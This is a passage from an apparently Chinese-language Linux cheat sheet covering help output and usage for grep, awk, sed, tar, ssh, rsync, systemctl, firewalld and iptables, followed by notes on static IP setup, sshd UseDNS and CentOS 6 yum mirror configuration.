sockets;</span><br><span class="line">                            ACTION is &#x27;read&#x27; or &#x27;skip&#x27;</span><br><span class="line">  -r, --recursive           like --directories=recurse</span><br><span class="line">  -R, --dereference-recursive</span><br><span class="line">                            likewise, but follow all symlinks</span><br><span class="line">      --include=FILE_PATTERN</span><br><span class="line">                            search only files that match FILE_PATTERN</span><br><span class="line">      --exclude=FILE_PATTERN</span><br><span class="line">                            skip files and directories matching FILE_PATTERN</span><br><span class="line">      --exclude-from=FILE   skip files matching any file pattern from FILE</span><br><span class="line">      --exclude-dir=PATTERN directories that match PATTERN will be skipped.</span><br><span class="line">  -L, --files-without-match print only names of FILEs containing no match</span><br><span class="line">  -l, --files-with-matches  print only names of FILEs containing matches</span><br><span class="line">  -c, --count               print only a count of matching lines per FILE</span><br><span class="line">  -T, --initial-tab         make tabs line up (if needed)</span><br><span class="line">  -Z, --null                print 0 byte after FILE name</span><br><span class="line"></span><br><span class="line">文件控制:</span><br><span class="line">  -B, --before-context=NUM  打印以文本起始的NUM 行</span><br><span class="line">  -A, --after-context=NUM   打印以文本结尾的NUM 行</span><br><span class="line">  -C, --context=NUM         打印输出文本NUM 行</span><br><span class="line">  -NUM                      same as --context=NUM</span><br><span class="line">      --group-separator=SEP use SEP as a group separator</span><br><span class="line">      --no-group-separator  use empty string as a group separator</span><br><span class="line">      --color[=WHEN],</span><br><span class="line">      --colour[=WHEN]       use markers to highlight the matching strings;</span><br><span class="line">                            WHEN is &#x27;always&#x27;, &#x27;never&#x27;, or &#x27;auto&#x27;</span><br><span class="line">  -U, --binary              do not strip CR characters at EOL (MSDOS/Windows)</span><br><span class="line">  -u, --unix-byte-offsets   report offsets as if CRs were not there</span><br><span class="line">                            (MSDOS/Windows)</span><br><span class="line"></span><br><span class="line">‘egrep’即‘grep -E’。‘fgrep’即‘grep -F’。</span><br><span class="line">直接使用‘egrep’或是‘fgrep’均已不可行了。</span><br><span class="line">若FILE 为 -，将读取标准输入。不带FILE，读取当前目录，除非命令行中指定了-r 选项。</span><br><span class="line">如果少于两个FILE 参数，就要默认使用-h 参数。</span><br><span class="line">如果有任意行被匹配，那退出状态为 0，否则为 1；</span><br><span class="line">如果有错误产生，且未指定 -q 参数，那退出状态为 2。</span><br></pre></td></tr></table></figure>

<h2 id="6-2-awk"><a href="#6-2-awk" class="headerlink" title="6.2 awk"></a>6.2 awk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: awk [POSIX or GNU style options] -f progfile [--] file ...</span><br><span class="line">Usage: awk [POSIX or GNU style options] [--] &#x27;program&#x27; file ...</span><br><span class="line">POSIX options:          GNU long options: (standard)</span><br><span class="line">        -f progfile             --file=progfile</span><br><span class="line">        -F fs                   --field-separator=fs</span><br><span class="line">        -v var=val              --assign=var=val</span><br><span class="line">Short options:          GNU long options: (extensions)</span><br><span class="line">        -b                      --characters-as-bytes</span><br><span class="line">        -c                      --traditional</span><br><span class="line">        -C                      --copyright</span><br><span class="line">        -d[file]                --dump-variables[=file]</span><br><span class="line">        -e &#x27;program-text&#x27;       --source=&#x27;program-text&#x27;</span><br><span class="line">        -E file                 --exec=file</span><br><span class="line">        -g                      --gen-pot</span><br><span class="line">        -h                      --help</span><br><span class="line">        -L [fatal]              --lint[=fatal]</span><br><span class="line">        -n                      --non-decimal-data</span><br><span class="line">        -N                      --use-lc-numeric</span><br><span class="line">        -O                      --optimize</span><br><span class="line">        -p[file]                --profile[=file]</span><br><span class="line">        -P                      --posix</span><br><span class="line">        -r                      --re-interval</span><br><span class="line">        -S                      --sandbox</span><br><span class="line">        -t                      --lint-old</span><br><span class="line">        -V                      --version</span><br><span class="line"></span><br><span class="line">To report bugs, see node `Bugs&#x27; in `gawk.info&#x27;, which is</span><br><span class="line">section `Reporting Problems and Bugs&#x27; in the printed version.</span><br><span class="line"></span><br><span class="line">gawk is a pattern scanning and processing language.</span><br><span class="line">By default it reads standard input and writes standard output.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">        gawk &#x27;&#123; sum += $1 &#125;; END &#123; print sum &#125;&#x27; file</span><br><span class="line">        gawk -F: &#x27;&#123; print $1 &#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="6-3-sed"><a href="#6-3-sed" class="headerlink" title="6.3 sed"></a>6.3 sed</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法: sed [选项]... &#123;脚本(如果没有其他脚本)&#125; [输入文件]...</span><br><span class="line"></span><br><span class="line">  -n, --quiet, --silent</span><br><span class="line">                 取消自动打印模式空间</span><br><span class="line">  -e 脚本, --expression=脚本</span><br><span class="line">                 添加“脚本”到程序的运行列表</span><br><span class="line">  -f 脚本文件, --file=脚本文件</span><br><span class="line">                 添加“脚本文件”到程序的运行列表</span><br><span class="line">  --follow-symlinks</span><br><span class="line">                 直接修改文件时跟随软链接</span><br><span class="line">  -i[SUFFIX], --in-place[=SUFFIX]</span><br><span class="line">                 edit files in place (makes backup if SUFFIX supplied)</span><br><span class="line">  -c, --copy</span><br><span class="line">                 use copy instead of rename when shuffling files in -i mode</span><br><span class="line">  -b, --binary</span><br><span class="line">                 does nothing; for compatibility with WIN32/CYGWIN/MSDOS/EMX (</span><br><span class="line">                 open files in binary mode (CR+LFs are not treated specially))</span><br><span class="line">  -l N, --line-length=N</span><br><span class="line">                 指定“l”命令的换行期望长度</span><br><span class="line">  --posix</span><br><span class="line">                 关闭所有 GNU 扩展</span><br><span class="line">  -r, --regexp-extended</span><br><span class="line">                 在脚本中使用扩展正则表达式</span><br><span class="line">  -s, --separate</span><br><span class="line">                 将输入文件视为各个独立的文件而不是一个长的连续输入</span><br><span class="line">  -u, --unbuffered</span><br><span class="line">                 从输入文件读取最少的数据，更频繁的刷新输出</span><br><span class="line">  -z, --null-data</span><br><span class="line">                 separate lines by NUL characters</span><br><span class="line">  --help</span><br><span class="line">                 display this help and exit</span><br><span class="line">  --version</span><br><span class="line">                 output version information and exit</span><br><span class="line"></span><br><span class="line">如果没有 -e, --expression, -f 或 --file 选项，那么第一个非选项参数被视为</span><br><span class="line">sed脚本。其他非选项参数被视为输入文件，如果没有输入文件，那么程序将从标准</span><br><span class="line">输入读取数据。</span><br><span class="line">GNU sed home page: &lt;http://www.gnu.org/software/sed/&gt;.</span><br><span class="line">General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;.</span><br><span class="line">E-mail bug reports to: &lt;bug-sed@gnu.org&gt;.</span><br><span class="line">Be sure to include the word ``sed&#x27;&#x27; somewhere in the ``Subject:&#x27;&#x27; field.</span><br></pre></td></tr></table></figure>

<h2 id="6-4-tar"><a href="#6-4-tar" class="headerlink" title="6.4 tar"></a>6.4 tar</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数说明：z(使用gzip)，c(create)，v(verbose)，f(file)，x(extract)。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩，把aaa/目录压缩成aaa.tar.gz。</span></span><br><span class="line">tar -zcvf aaa.tar.gz aaa/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩多个文件</span></span><br><span class="line">tar -zcvf package.tar.gz 1.txt 2.txt 3.png</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压，把当前目录下的aaa.tar.gz解压到目录bbb中，加-C指定路径。</span></span><br><span class="line">tar -zxvf aaa.tar.gz -C bbb</span><br></pre></td></tr></table></figure>

<h2 id="6-5"><a href="#6-5" class="headerlink" title="6.5 |"></a>6.5 |</h2><p>用法：命令1 | 命令2			管道命令，用|把两个命令连起来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">find . -type f | xargs grep &quot;aa&quot;	检索当前目录及子目录下，所有包含&quot;aa&quot;的文件</span><br></pre></td></tr></table></figure>

<h2 id="6-6-whereis"><a href="#6-6-whereis" class="headerlink" title="6.6 whereis"></a>6.6 whereis</h2><p>用法：whereis [选项] 文件		查找命令、手册、源码的位置，例如：whereis ls</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-b         只搜索二进制文件</span><br><span class="line">-B &lt;目录&gt;  定义二进制文件查找路径</span><br><span class="line">-m         只搜索 man 手册</span><br><span class="line">-M &lt;目录&gt;  定义 man 手册查找路径</span><br><span class="line">-s         只搜索源代码</span><br><span class="line">-S &lt;目录&gt;  定义源代码查找路径</span><br><span class="line">-f         终止 &lt;目录&gt; 参数列表</span><br><span class="line">-u         搜索不常见记录</span><br><span class="line">-l         输出有效查找路径</span><br></pre></td></tr></table></figure>

<h2 id="6-7-which"><a href="#6-7-which" class="headerlink" title="6.7 which"></a>6.7 which</h2><p>用法：which &lt;命令&gt;		输出命令的全路径</p>
<h2 id="6-8-uname"><a href="#6-8-uname" class="headerlink" title="6.8 uname"></a>6.8 uname</h2><p>用法：uname [选项]…		查看系统版本信息，默认-s参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a, --all					以如下次序输出所有信息。其中若-p和-i的探测结果不可知则被省略</span><br><span class="line">-s, --kernel-name			输出内核名称</span><br><span class="line">-n, --nodename				输出网络节点上的主机名</span><br><span class="line">-r, --kernel-release		输出内核发行号</span><br><span class="line">-v, --kernel-version		输出内核版本</span><br><span class="line">-m, --machine				输出主机的硬件架构名称</span><br><span class="line">-p, --processor				输出处理器类型或&quot;unknown&quot;</span><br><span class="line">-i, --hardware-platform		输出硬件平台或&quot;unknown&quot;</span><br><span class="line">-o, --operating-system		输出操作系统名称</span><br></pre></td></tr></table></figure>

<h2 id="6-9-who-whoami"><a href="#6-9-who-whoami" class="headerlink" title="6.9 who &amp; whoami"></a>6.9 who &amp; whoami</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">who		查看当前登录用户名、登录时间</span><br><span class="line">whoami	查看当前登录用户名</span><br></pre></td></tr></table></figure>

<h2 id="6-10-yum"><a href="#6-10-yum" class="headerlink" title="6.10 yum"></a>6.10 yum</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装、更新、卸载，参数-y(--assumeyes)表示回答全部问题为是，--assumeno表示回答全部问题为否。</span></span><br><span class="line">yum -y install/update/remove net-tools</span><br></pre></td></tr></table></figure>

<h2 id="6-11-rpm"><a href="#6-11-rpm" class="headerlink" title="6.11 rpm"></a>6.11 rpm</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">rpm -ivh rabbitmq-server-3.8.3-1.el7.noarch.rpm		使用rpm包安装</span><br><span class="line">rpm -Uvh rabbitmq-server-3.8.3-1.el7.noarch.rpm		使用rpm更新</span><br><span class="line">rpm -ev rabbitmq-server                             卸载</span><br></pre></td></tr></table></figure>

<h2 id="6-12-date"><a href="#6-12-date" class="headerlink" title="6.12 date"></a>6.12 date</h2><p>用法：date [选项]… [+格式]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出：年-月-日 时:分:秒</span></span><br><span class="line">date &quot;+%Y-%m-%d %H:%M:%S&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置系统时间</span></span><br><span class="line">date -s &quot;06/28/2019 21:30:12&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-13-wget"><a href="#6-13-wget" class="headerlink" title="6.13 wget"></a>6.13 wget</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载文件，并指定文件名（-O参数），若命令缺失，先安装：yum -y install wget</span></span><br><span class="line">wget [-O file] &lt;URL&gt;</span><br></pre></td></tr></table></figure>

<h2 id="6-14-ssh"><a href="#6-14-ssh" class="headerlink" title="6.14 ssh"></a>6.14 ssh</h2><p>用法: ssh user@remote [-p port]			远程登录，不指定端口默认22</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在~/.ssh/下生成rsa密钥对，把公钥粘贴到远程用户的~/.ssh/authorized_keys文件中，即可实现免密登录</span></span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-15-scp"><a href="#6-15-scp" class="headerlink" title="6.15 scp"></a>6.15 scp</h2><p>用法：scp [选项] [[user@]host1:]file1 [[user@]host2:]file2			安全复制，源和目标都可以是远程主机上的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-C		传输过程中压缩。</span><br><span class="line">-p		保留原文件的修改时间，访问时间和访问权限。</span><br><span class="line">-P port 指定数据传输的端口号。</span><br><span class="line">-q		不显示传输进度条。</span><br><span class="line">-r		递归复制整个目录。</span><br><span class="line">-v		详细方式显示输出。</span><br></pre></td></tr></table></figure>

<h2 id="6-16-rsync"><a href="#6-16-rsync" class="headerlink" title="6.16 rsync"></a>6.16 rsync</h2><p>用法：rsync [选项] [[user@]host1:]file1 [[user@]host2:]file2		远程同步，保持原来文件的权限、时间、软硬链接等附加信息，源和目标不能都是远程的。</p>
<p>若命令缺失，先安装：yum -y install rsync</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数（-avzP）：</span></span><br><span class="line">-a, --archive               archive mode; equals -rlptgoD (no -H,-A,-X)</span><br><span class="line">-h, --human-readable        output numbers in a human-readable format</span><br><span class="line">-P                          same as --partial --progress（显示同步过程、传输进度等信息）</span><br><span class="line">-r, --recursive             recurse into directories</span><br><span class="line">-v, --verbose               increase verbosity</span><br><span class="line">-z, --compress              compress file data during the transfer</span><br></pre></td></tr></table></figure>

<h2 id="6-17-clear"><a href="#6-17-clear" class="headerlink" title="6.17 clear"></a>6.17 clear</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清屏</span></span><br><span class="line">clear</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清屏，可往上翻看记录</span></span><br><span class="line">ctrl + l</span><br></pre></td></tr></table></figure>

<h2 id="6-18-ifconfig-ip-addr"><a href="#6-18-ifconfig-ip-addr" class="headerlink" title="6.18 ifconfig &amp; ip addr"></a>6.18 ifconfig &amp; ip addr</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ip，若命令缺失，先安装：yum -y install net-tools</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">ip addr</span><br></pre></td></tr></table></figure>

<h2 id="6-19-ps"><a href="#6-19-ps" class="headerlink" title="6.19 ps"></a>6.19 ps</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看tomcat进程</span></span><br><span class="line">ps -ef|grep tomcat</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">ps aux|grep tomcat</span><br></pre></td></tr></table></figure>

<h2 id="6-20-kill-pkill"><a href="#6-20-kill-pkill" class="headerlink" title="6.20 kill &amp; pkill"></a>6.20 kill &amp; pkill</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过进程<span class="built_in">id</span>强制杀死进程</span></span><br><span class="line">kill -9 pid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过进程名称杀死进程，可通过*模糊匹配</span></span><br><span class="line">pkill -f 进程名称</span><br></pre></td></tr></table></figure>

<h2 id="6-21-service"><a href="#6-21-service" class="headerlink" title="6.21 service"></a>6.21 service</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态、启动服务、停止服务、重启服务</span></span><br><span class="line">service &lt;service_name&gt; status/start/stop/restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">service network status</span><br></pre></td></tr></table></figure>

<h2 id="6-22-systemctl"><a href="#6-22-systemctl" class="headerlink" title="6.22 systemctl"></a>6.22 systemctl</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务：开启/停止/重启/查看状态/开启自启动/关闭自启动/是否自启动</span></span><br><span class="line">systemctl start/stop/restart/status/enable/disable/is-enabled &lt;service_name&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看已启动的服务列表</span></span><br><span class="line">systemctl list-unit-files|grep enabled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看启动失败的服务列表</span></span><br><span class="line">systemctl –failed</span><br></pre></td></tr></table></figure>

<h2 id="6-23-firewalld-centos7"><a href="#6-23-firewalld-centos7" class="headerlink" title="6.23 firewalld(centos7)"></a>6.23 firewalld(centos7)</h2><ul>
<li>服务相关</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启/停止/重启/查看状态/开启自启动/关闭自启动/是否自启动</span></span><br><span class="line">systemctl start/stop/restart/status/enable/disable/is-enabled firewalld</span><br></pre></td></tr></table></figure>

<ul>
<li>firewall-cmd命令，端口可为tcp或udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加端口，--permanent永久生效，没有此参数重启后失效</span></span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新载入</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有打开的端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移除端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################### 添加、重新加载并查看端口 ################################</span></span></span><br><span class="line">firewall-cmd --zone=public --add-port=6666/tcp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################### 添加、重新加载并查看端口 ################################</span></span></span><br></pre></td></tr></table></figure>

<h2 id="6-24-iptables-centos6"><a href="#6-24-iptables-centos6" class="headerlink" title="6.24 iptables(centos6)"></a>6.24 iptables(centos6)</h2><ul>
<li>-A（append）和-I（insert）区别，-A是追加在规则后方，-I是在最前面插入，如果使用追加的方式，可能导致追加的端口在REJECT的后方，导致端口没有开放成功。因此添加拒绝策略最好用-A参数，添加开放规则最好用-I。</li>
<li>如果想要防火墙重启后还生效，需要执行 <code>/etc/init.d/iptables save</code> 进行保存防火墙策略</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭iptables服务的开机自启动</span></span><br><span class="line">chkconfig iptables off</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启iptables服务的开机自启动</span></span><br><span class="line">chkconfig iptables on</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许访问80端口</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接删除80端口</span></span><br><span class="line">iptables -D INPUT -p tcp --dport 80 -j ACCEPT     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看规则</span></span><br><span class="line">iptables -nvL  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看规则行号</span></span><br><span class="line">iptables -nvL --line-number   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按行号删除，删除第二行规则</span></span><br><span class="line">iptables -D INPUT 2     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">来自172.16.0.0/16网段的都允许访问本机172.16.100.1的22端口的服务</span></span><br><span class="line">iptables -t filter -I INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp --dport 22 -j ACCEPT     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启iptables</span></span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>

<h2 id="6-25-netstat"><a href="#6-25-netstat" class="headerlink" title="6.25 netstat"></a>6.25 netstat</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查端口是否被占用</span></span><br><span class="line">netstat -apn|grep 80</span><br></pre></td></tr></table></figure>

<h2 id="6-26-ping"><a href="#6-26-ping" class="headerlink" title="6.26 ping"></a>6.26 ping</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查网络是否连通，ctrl+c终止测试</span></span><br><span class="line">ping IP</span><br></pre></td></tr></table></figure>

<h2 id="6-27-telnet"><a href="#6-27-telnet" class="headerlink" title="6.27 telnet"></a>6.27 telnet</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否能连通指定IP的指定端口，若命令缺失，先安装：yum -y install telnet</span></span><br><span class="line">telnet IP PORT</span><br></pre></td></tr></table></figure>

<h1 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h1><h2 id="虚拟机centos配置静态IP"><a href="#虚拟机centos配置静态IP" class="headerlink" title="虚拟机centos配置静态IP"></a>虚拟机centos配置静态IP</h2><ul>
<li>编辑&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33（不一定是ens33网卡，也有可能是eth0或其它）</li>
</ul>
<p>说明：这里使用NAT模式，在VMware的NAT模式，设置子网IP为192.168.22.0、网关为192.168.22.2，这个网段1号IP默认留给VMnet8，255为广播号，因此静态IP不能为该网段的0、1、2、255。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 配置静态IP，把dhcp改为static，添加IPADDR（IP地址）、GATEWAY（网关地址）、NETMASK（子网掩码）、DNS1（DNS服务器）、DNS2（DNS服务器）</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=&quot;192.168.22.10&quot;</span><br><span class="line">GATEWAY=&quot;192.168.22.2&quot;</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">DNS1=&quot;114.114.114.114&quot;</span><br><span class="line">DNS2=&quot;114.114.115.115&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>重启网络服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

<h2 id="远程登录centos慢的问题"><a href="#远程登录centos慢的问题" class="headerlink" title="远程登录centos慢的问题"></a>远程登录centos慢的问题</h2><ul>
<li>编辑&#x2F;etc&#x2F;ssh&#x2F;sshd_config</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">UseDNS <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改为</span></span><br><span class="line">UseDNS no</span><br></pre></td></tr></table></figure>

<ul>
<li>重启服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h2 id="centos6-yum的网络问题"><a href="#centos6-yum的网络问题" class="headerlink" title="centos6 yum的网络问题"></a>centos6 yum的网络问题</h2><blockquote>
<p>问题：YumRepo Error: All mirror URLs are not using ftp, http[s] or file.</p>
</blockquote>
<ul>
<li>编辑&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo</li>
<li>注释掉每个模块中的mirrorlist、gpgkey，同时在对应的模块下，添加清华节点的baseurl、gpgkey，可参考如下配置：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CentOS-Base.repo</span><br><span class="line">#</span><br><span class="line"># The mirror system uses the connecting IP address of the client and the</span><br><span class="line"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="line"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="line"># unless you are manually picking other mirrors.</span><br><span class="line">#</span><br><span class="line"># If the mirrorlist= does not work for you, as a fall back you can try the</span><br><span class="line"># remarked out baseurl= line instead.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">[base]</span><br><span class="line">name=CentOS-$releasever - Base</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</span><br><span class="line">#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line">#released updates</span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-$releasever - Updates</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra</span><br><span class="line">#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/updates/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line">#additional packages that may be useful</span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-$releasever - Extras</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra</span><br><span class="line">#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/extras/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line">#additional packages that extend functionality of existing packages</span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-$releasever - Plus</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra</span><br><span class="line">#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/centosplus/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line">#contrib - packages by Centos Users</span><br><span class="line">[contrib]</span><br><span class="line">name=CentOS-$releasever - Contrib</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=contrib&amp;infra=$infra</span><br><span class="line">#baseurl=http://mirror.centos.org/centos/$releasever/contrib/$basearch/</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/contrib/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/centos-vault/6.8/os/x86_64/RPM-GPG-KEY-CentOS-6</span><br></pre></td></tr></table></figure>

